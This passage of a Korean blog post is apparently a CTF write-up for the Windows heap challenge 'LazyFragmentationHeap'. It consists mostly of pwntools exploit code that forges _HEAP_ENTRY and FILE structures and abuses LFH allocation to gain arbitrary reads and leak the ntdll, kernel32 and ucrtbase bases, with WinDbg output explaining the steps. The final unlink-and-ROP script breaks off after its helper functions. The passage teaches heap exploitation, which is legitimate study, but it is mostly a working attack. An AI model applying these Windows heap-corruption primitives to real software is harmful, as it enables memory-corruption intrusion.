</span>	         <span class="mh">0x200</span>     <span class="c1"># orginal size of overwritten chunk
</span>	<span class="p">)</span> 
	<span class="n">open_file</span><span class="p">()</span>
	<span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>
	<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4
</span>	<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4
</span>
	<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x150</span>
	<span class="k">if</span> <span class="n">heap_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Heap address not leaked"</span><span class="p">)</span>
        <span class="k">return</span>

	<span class="c1"># default target is ntdll on _HEAP-&gt;LockVariable-&gt;Lock
</span>	<span class="k">if</span> <span class="n">cursor</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="n">cursor</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2c0</span>
		
	<span class="c1"># log.info("&amp;_HEAP = 0x%016x" % heap_base)
</span>
	<span class="c1"># make LFH to allocate new Userblock in chunk 4
</span>	<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
		<span class="n">open_file</span><span class="p">()</span>

	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xbcd0</span><span class="p">)</span>   <span class="c1"># +0x000 SubSegment
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e40</span><span class="p">)</span>  <span class="c1"># +0x008 Reserved
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span>                  <span class="c1"># +0x010 SizeIndexAndPadding
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf0e0d0c0</span><span class="p">)</span>           <span class="c1"># +0x014 Signature
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>                <span class="c1"># I couldn't leak other values
</span>
	<span class="n">fake_FILE</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c1"># _HEAP_ENTRY
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>             <span class="c1"># cursor of SEEK_CUR
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span>    <span class="c1"># base address
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>              <span class="c1"># remaining file size
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2041</span><span class="p">)</span>             <span class="c1"># I dunno what they are
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>				
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

	<span class="n">for_leak</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_HEAP_USERDATA_HEADER</span>
	<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_FILE</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_FILE</span><span class="p">))</span>

	<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">for_leak</span><span class="p">)</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>

	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
	<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"info"</span>
	<span class="k">return</span> <span class="n">result</span>


<span class="n">ntdll_base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x163d70</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ntdll = 0x%016x"</span> <span class="o">%</span> <span class="n">ntdll_base</span><span class="p">)</span>
</code></pre></div></div> <p><strong>ntdll.dll</strong>은 아무래도 Windows의 핵심 모듈이다 보니 외부 모듈을 참조하지 않아 IAT는 없지만, 내부적으로 <strong>PebLdr</strong>이라고 <strong>_PEB-&gt;Ldr</strong>가 가리키는 로드된 모듈끼리의 Double Linked List가 존재합니다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:001&gt; dt ntdll!_PEB @$peb Ldr
   +0x018 Ldr : 0x00007ffd`09c653c0 _PEB_LDR_DATA &lt;---------|
                                                            |
0:001&gt; ? ntdll!PebLdr                                       |
Evaluate expression: 140724767445952 = 00007ffd`09c653c0 &lt;--|

0:001&gt; dt ntdll!_PEB_LDR_DATA 00007ffd`09c653c0
   +0x000 Length           : 0x58
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null) 
   +0x010 InLoadOrderModuleList : _LIST_ENTRY [ 0x0000016c`d7702780 - 0x0000016c`d7705d20 ]
   +0x020 InMemoryOrderModuleList : _LIST_ENTRY [ 0x0000016c`d7702790 - 0x0000016c`d7705d30 ]
   +0x030 InInitializationOrderModuleList : _LIST_ENTRY [ 0x0000016c`d7702610 - 0x0000016c`d7702e40 ]
   +0x040 EntryInProgress  : (null) 
   +0x048 ShutdownInProgress : 0 ''
   +0x050 ShutdownThreadId : (null) 

0:001&gt; dqs 16c`d7702780
0000016c`d7702780  0000016c`d77025f0
0000016c`d7702788  00007ffd`09c653d0 ntdll!PebLdr+0x10
0000016c`d7702790  0000016c`d7702600
0000016c`d7702798  00007ffd`09c653e0 ntdll!PebLdr+0x20
0000016c`d77027a0  00000000`00000000
0000016c`d77027a8  00000000`00000000
0000016c`d77027b0  00007ff7`6f400000 LazyFragmentationHeap
0000016c`d77027b8  00007ff7`6f401bf0 LazyFragmentationHeap+0x1bf0
....
</code></pre></div></div> <p>분석을 하다 알게되었는데, <strong>_PEB_LDR_DATA-&gt;InLoadOrderModuleList</strong>가 가리키는 Heap 영역의 offset이 항상 <strong>0x27b0</strong>으로 고정되어 있어 아래와 같이 바로 leak할 수 있고, IAT를 통해 다른 라이브러리의 주소도 구할 수 있었습니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context.log_level = "debug"
</span>
<span class="c1"># HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
</span><span class="n">HOST</span> <span class="o">=</span> <span class="s">"192.168.0.18"</span> <span class="c1"># VirtualBox Bridge 
</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">6677</span>
<span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0xC8</span> <span class="c1"># yes, I intend korean slang
</span>
<span class="n">hi</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">sla</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">need_newline</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">if</span> <span class="n">need_newline</span><span class="p">:</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">hi</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">open_file</span><span class="p">():</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">cursor</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">disconn</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">leakLazy</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
	<span class="k">global</span> <span class="n">hi</span><span class="p">,</span> <span class="n">sla</span>
	<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"error"</span>
	<span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
	<span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>

	<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
	<span class="k">except</span> <span class="n">struct</span><span class="p">.</span><span class="n">error</span><span class="p">:</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP_ENTRY not leaked"</span><span class="p">)</span>
		<span class="k">return</span>

	<span class="c1"># log.info("_HEAP-&gt;Encoding = 0x%016x" % heap_encod)
</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
	<span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
	<span class="s">'''
	0x10000027c80101c8
	   +0x008 Size             : 0x1c8
	   +0x00a Flags            : 0x1 ''
	   +0x00b SmallTagIndex    : 0xc8 ''
	   +0x008 SubSegmentCode   : 0xc80101c8
	   +0x00c PreviousSize     : 0x27
	   +0x00e SegmentOffset    : 0 ''
	   +0x00e LFHFlags         : 0 ''
	   +0x00f UnusedBytes      : 0x10 ''
	'''</span>

	<span class="c1"># log.info("fake XOR'ed _HEAP_ENTRY = 0x%016x" % fake_entry)
</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x1c80</span> <span class="o">-</span>  <span class="c1"># fake chunk size 
</span>	         <span class="mh">0x20</span>   <span class="o">-</span>  <span class="c1"># sizeof(_HEAP_ENTRY) * 2
</span>	         <span class="mh">0x200</span>     <span class="c1"># orginal size of overwritten chunk
</span>	<span class="p">)</span> 
	<span class="n">open_file</span><span class="p">()</span>
	<span class="n">read_file</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mh">0x268</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_entry</span><span class="p">)[:</span><span class="mi">6</span><span class="p">],</span> <span class="bp">False</span><span class="p">)</span>
	<span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free coalesce mechanism also free'ing chunk 4
</span>	<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># set Flink and Blink at chunk 4
</span>
	<span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x150</span>
	<span class="k">if</span> <span class="n">heap_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Heap address not leaked"</span><span class="p">)</span>
		<span class="k">return</span>

	<span class="k">if</span> <span class="n">leakLazy</span><span class="p">:</span>
		<span class="n">cursor</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x27b2</span> <span class="c1"># can't leak null-byte
</span>	<span class="k">elif</span> <span class="n">cursor</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
		<span class="c1"># default target is ntdll on _HEAP-&gt;LockVariable-&gt;Lock
</span>		<span class="n">cursor</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x2c0</span>
		
	<span class="c1"># log.info("&amp;_HEAP = 0x%016x" % heap_base)
</span>
	<span class="c1"># make LFH to allocate new UserBlock in chunk 4
</span>	<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x14</span><span class="p">):</span>
		<span class="n">open_file</span><span class="p">()</span>

	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xbcd0</span><span class="p">)</span>   <span class="c1"># +0x000 SubSegment
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x12e40</span><span class="p">)</span>  <span class="c1"># +0x008 Reserved
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span>                  <span class="c1"># +0x010 SizeIndexAndPadding
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf0e0d0c0</span><span class="p">)</span>           <span class="c1"># +0x014 Signature
</span>	<span class="n">fake_HEAP_USERDATA_HEADER</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">5</span>                <span class="c1"># I couldn't leak other values
</span>
	<span class="n">fake_FILE</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>              <span class="c1"># _HEAP_ENTRY
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>             <span class="c1"># cursor of SEEK_CUR
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">cursor</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span>    <span class="c1"># base address
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x800</span><span class="p">)</span>              <span class="c1"># remaining file size
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2041</span><span class="p">)</span>             <span class="c1"># I dunno what they are
</span>	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x17</span><span class="p">)</span>				
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">fake_FILE</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

	<span class="n">for_leak</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_HEAP_USERDATA_HEADER</span>
	<span class="n">for_leak</span> <span class="o">+=</span> <span class="n">fake_FILE</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">fake_FILE</span><span class="p">))</span>

	<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">for_leak</span><span class="p">)</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">leakLazy</span><span class="p">:</span>
		<span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span>
		<span class="n">result</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">4</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">read_file</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span>
		<span class="n">result</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>

	<span class="k">if</span> <span class="n">disconn</span><span class="p">:</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

	<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"info"</span>
	<span class="k">return</span> <span class="n">result</span>

<span class="n">lazy_base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">leakLazy</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LazyFragmentationHeap = 0x%016x"</span> <span class="o">%</span> <span class="n">lazy_base</span><span class="p">)</span>

<span class="n">kernel32</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x3008</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1e690</span>  <span class="c1"># KERNEL32!IsDebuggerPresentStub
</span><span class="n">ntdll</span>    <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x3010</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x73810</span>  <span class="c1"># ntdll!RtlInitializeSListHead
</span><span class="n">ucrtbase</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">lazy_base</span><span class="o">+</span><span class="mh">0x30b0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x0f760</span>  <span class="c1"># ucrtbase!free
</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"kernel32 = 0x%016x"</span> <span class="o">%</span> <span class="n">kernel32</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ntdll    = 0x%016x"</span> <span class="o">%</span> <span class="n">ntdll</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ucrtbase = 0x%016x"</span> <span class="o">%</span> <span class="n">ucrtbase</span><span class="p">)</span>

<span class="s">'''
[*] LazyFragmentationHeap = 0x00007ff76f400000
[*] kernel32 = 0x00007ffd09140000
[*] ntdll    = 0x00007ffd09b00000
[*] ucrtbase = 0x00007ffd075e0000
'''</span>
</code></pre></div></div> <p>필요한 모듈주소를 모두 leak 했으니 이제 마지막 익스플로잇 단계만 남았습니다.</p> <p>공격기법은 <a href="#310-allocate-and-free-non-lfh-chunk">3.10. Allocate and Free Non-LFH chunk</a>에서 언급한대로 Unsafe Unlink 기법을 이용해 R/W primitive를 만들어서 ROP를 해야하는데, 이후의 부분은 LFH보단 일반적인 Heap Feng-Shui에 가깝기 때문에 설명은 코드에 달린 주석으로 생략할려고 합니다.</p> <p>근데 이거저거 재밌는게 많아서 이부분은 직접 한번 해보시는걸 추천해드립니다!</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context.log_level = "debug"
</span>
<span class="c1"># HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
</span><span class="n">HOST</span> <span class="o">=</span> <span class="s">"192.168.0.18"</span> <span class="c1"># VirtualBox Bridge 
</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">6677</span>
<span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0xC8</span> <span class="c1"># yes, I intend korean slang
</span>
<span class="n">hi</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">sla</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

